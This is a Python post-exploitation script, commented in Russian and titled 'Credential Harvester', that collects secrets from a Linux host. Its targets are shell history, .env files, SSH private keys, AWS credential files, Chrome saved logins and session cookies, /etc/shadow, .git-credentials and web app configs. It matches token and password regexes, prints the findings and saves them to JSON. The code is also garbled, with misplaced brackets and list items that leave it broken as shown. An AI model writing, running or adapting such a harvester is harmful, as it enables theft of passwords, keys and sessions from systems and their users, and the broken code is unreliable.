#!/usr/bin/env python3
import os
import re
import sqlite3
import base64
import json
import argparse
from pathlib import Path
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# Паттерны для поиска credentials
CRED_PATTERNS = {
"API Keys": [
r'(?i)(api[_\-]?key|apikey|api[_\-]?secret)\s*[=:]\s*["\']?([A-Za-z0-9\-_]{16,64})',
}
r'(?i)(access[_\-]?token)\s*[=:]\s*["\']?([A-Za-z0-9\-_\.]{20,})',
],
"AWS": [
r'(?i)(aws[_\-]?access[_\-]?key[_\-]?id)\s*[=:]\s*["\']?(AKIA[A-Z0-9]{16})',
r'(?i)(aws[_\-]?secret[_\-]?access[_\-]?key)\s*[=:]\s*["\']?([A-Za-z0-9+/]{40})',
],
"Passwords": [
r'(?i)(password|passwd|pwd|pass)\s*[=:]\s*["\']?([^\s"\']{6,})',
r'(?i)(db[_\-]?pass|database[_\-]?password)\s*[=:]\s*["\']?([^\s"\']{4,})',
],
"Database URLs": [
r'(?i)(mysql|postgresql|mongodb|redis)://[^\s"\']+',
r'(?i)(jdbc:[^\s"\']+)',
],
"Private Keys": [
r'-----BEGIN (RSA|EC|OPENSSH|DSA) PRIVATE KEY-----',
r'(?i)(private[_\-]?key)\s*[=:]\s*["\']?([^\s"\']{20,})',
],
"Tokens": [
r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*', # JWT
r'ghp_[A-Za-z0-9]{36}', # GitHub Personal Access Token
r'glpat-[A-Za-z0-9\-_]{20}', # GitLab PAT
r'xoxb-[A-Za-z0-9\-]+', # Slack Bot Token
r'sk-[A-Za-z0-9]{48}', # OpenAI API Key
],
findings = []
def log_finding(category: str, source: str, value: str) -> None:
"""Сохраняем и выводим находку."""
entry = {"category": category, "source": source, "value": value[:200]}
findings.append(entry)
print(f" {GREEN}[{category}] {source}{RESET}")
print(f" → {value[:100]}")
def search_file_for_creds(filepath: str) -> None:
"""Ищем credentials паттерны в файле."""
try:
with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
content = f.read()
for category, patterns in CRED_PATTERNS.items():
for pattern in patterns:
matches = re.finditer(pattern, content)
for match in matches:
value = match.group(0)
log_finding(category, filepath, value)
except (PermissionError, OSError):
pass
def harvest_bash_history() -> None:
"""История bash команд — часто содержит пароли в аргументах."""
print(f"\n{YELLOW}[*] Bash History{RESET}")
history_files = [
os.path.expanduser("~/.bash_history"),
os.path.expanduser("~/.zsh_history"),
os.path.expanduser("~/.sh_history"),
"/root/.bash_history",
]
sensitive_patterns = [
r'(?i)(password|passwd|pass|secret|token|key)\s*[\=:]\s*\S+',
r'(?i)(-p\s*\S+)', # mysql -p password
r'(?i)(--password=\S+)',
r'(?i)(curl.*-u\s+\S+)',
r'(?i)(aws\s+configure)',
r'scp|sftp|ssh',
]
for hist_file in history_files:
if not os.path.exists(hist_file):
continue
try:
with open(hist_file, encoding="utf-8", errors="ignore") as f:
lines = f.readlines()
for line in lines:
line = line.strip()
for pattern in sensitive_patterns:
if re.search(pattern, line):
log_finding("Bash History", hist_file, line)
break
except (PermissionError, OSError):
pass
def harvest_env_files() -> None:
"""Файлы .env — обычно полны секретов."""
print(f"\n{YELLOW}[*] .env файлы{RESET}")
search_paths = [
os.path.expanduser("~"),
"/var/www",
"/srv",
"/opt",
"/home",
]
for base_path in search_paths:
if not os.path.exists(base_path):
continue
for root, dirs, files in os.walk(base_path):
# Ограничиваем глубину
depth = root.replace(base_path, "").count(os.sep)
if depth > 5:
dirs.clear()
continue
for filename in files:
if filename in (".env", ".env.local", ".env.production",
".env.development", "config.env"):
filepath = os.path.join(root, filename)
search_file_for_creds(filepath)
def harvest_ssh_keys() -> None:
"""SSH ключи и known_hosts."""
print(f"\n{YELLOW}[*] SSH ключи{RESET}")
ssh_dirs = [
os.path.expanduser("~/.ssh"),
"/root/.ssh",
"/etc/ssh",
]
for ssh_dir in ssh_dirs:
if not os.path.exists(ssh_dir):
continue
for filename in os.listdir(ssh_dir):
filepath = os.path.join(ssh_dir, filename)
if os.path.isfile(filepath):
try:
with open(filepath, encoding="utf-8", errors="ignore") as f:
content = f.read()
if "PRIVATE KEY" in content:
log_finding("SSH Private Key", filepath,
content[:100] + "...")
elif filename == "known_hosts":
lines = content.strip().split("\n")
print(f" {CYAN}[Known Hosts] {filepath} — {len(lines)}
хостов{RESET}")
for line in lines[:5]:
print(f" → {line[:80]}")
elif filename == "authorized_keys":
print(f" {CYAN}[Authorized Keys] {filepath}{RESET}")
log_finding("SSH Authorized Keys", filepath, content[:200])
except (PermissionError, OSError):
pass
def harvest_aws_credentials() -> None:
"""AWS credentials файлы."""
print(f"\n{YELLOW}[*] AWS Credentials{RESET}")
aws_files = [
os.path.expanduser("~/.aws/credentials"),
]
os.path.expanduser("~/.aws/config"),
"/root/.aws/credentials",
for filepath in aws_files:
if os.path.exists(filepath):
try:
with open(filepath) as f:
content = f.read()
log_finding("AWS Credentials", filepath, content[:300])
except (PermissionError, OSError):
pass
def harvest_browser_sqlite() -> None:
print(f"\n{YELLOW}[*] Браузерные данные{RESET}")
# Пути к SQLite базам Chrome/Chromium/Firefox
browser_db_paths = {
"Chrome Login Data": [
os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
os.path.expanduser("~/.config/chromium/Default/Login Data"),
],
"Firefox Logins": [
# Firefox хранит в JSON, а не SQLite для паролей
],
"Chrome Cookies": [
os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
],
"Chrome History": [
os.path.expanduser("~/.config/google-chrome/Default/History"),
],
}
for db_type, paths in browser_db_paths.items():
for db_path in paths:
if not os.path.exists(db_path):
continue
try:
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
if "Login Data" in db_type:
cursor.execute(
"SELECT origin_url, username_value, password_value "
"FROM logins WHERE username_value != ''"
)
for row in cursor.fetchall():
url, username, enc_password = row
# На Linux Chrome использует Basic encryption или Gnome keyring
# На Windows: DPAPI. Здесь показываем только URL и логин
entry = f"{url} | user: {username} | pass: [encrypted]"
log_finding("Chrome Saved Login", db_path, entry)
elif "Cookies" in db_type:
cursor.execute(
"SELECT host_key, name, value FROM cookies "
"WHERE name IN ('session', 'auth', 'token', 'jwt') LIMIT 10"
)
for row in cursor.fetchall():
host, name, value = row
if value:
log_finding("Browser Cookie", db_path,
f"{host} | {name}={value[:50]}")
conn.close()
except (sqlite3.Error, PermissionError, OSError):
pass
def harvest_config_files() -> None:
print(f"\n{YELLOW}[*] Конфигурационные файлы{RESET}")
config_files = [
"/etc/mysql/my.cnf",
"/etc/mysql/mysql.conf.d/mysqld.cnf",
os.path.expanduser("~/.my.cnf"),
os.path.expanduser("~/.pgpass"),
os.path.expanduser("~/.netrc"),
"/etc/passwd",
"/etc/shadow",
]
"/etc/openvpn/client.conf",
os.path.expanduser("~/.git-credentials"),
os.path.expanduser("~/.npmrc"),
os.path.expanduser("~/.pypirc"),
"/var/www/html/wp-config.php",
"/var/www/html/config.php",
for filepath in config_files:
if os.path.exists(filepath):
try:
with open(filepath, encoding="utf-8", errors="ignore") as f:
content = f.read()
if filepath.endswith(("/passwd", "/shadow")):
lines = content.strip().split("\n")
print(f" {CYAN}[System Accounts] {filepath} — {len(lines)}
записей{RESET}")
for line in lines[:5]:
print(f" → {line}")
else:
search_file_for_creds(filepath)
if filepath.endswith(".php") and ("DB_PASSWORD" in content or
"database_password" in content):
log_finding("PHP Config", filepath, content[:300])
except (PermissionError, OSError):
pass
def main():
parser = argparse.ArgumentParser(description="Credential Harvester")
parser.add_argument("--deep", action="store_true",
help="Глубокий поиск по всей файловой системе")
parser.add_argument("--output", default=None, help="Сохранить результаты в
JSON")
args = parser.parse_args()
print(f"{CYAN}{'='*60}")
print(" Credential Harvester")
print(f" Хост: {os.uname().nodename}")
print(f" User: {os.getenv('USER', 'unknown')}")
print(f"{'='*60}{RESET}")
harvest_bash_history()
harvest_env_files()
harvest_ssh_keys()
harvest_aws_credentials()
harvest_browser_sqlite()
harvest_config_files()
if args.deep:
print(f"\n{YELLOW}[*] Глубокий поиск по файловой системе...{RESET}")
for root, dirs, files in os.walk("/"):
# Пропускаем системные директории
dirs[:] = [d for d in dirs if d not in
("proc", "sys", "dev", "run", "tmp", "media", "mnt")]
for filename in files:
if filename.endswith((".conf", ".config", ".ini", ".cfg",
".yaml", ".yml", ".json", ".xml")):
filepath = os.path.join(root, filename)
search_file_for_creds(filepath)
print(f"\n{GREEN}{'='*60}")
print(f" ИТОГО: найдено {len(findings)} credentials")
print(f"{'='*60}{RESET}")
if args.output and findings:
with open(args.output, "w") as f:
json.dump(findings, f, indent=2, ensure_ascii=False)
print(f"{GREEN}[+] Сохранено в {args.output}{RESET}")
if __name__ == "__main__":
main()
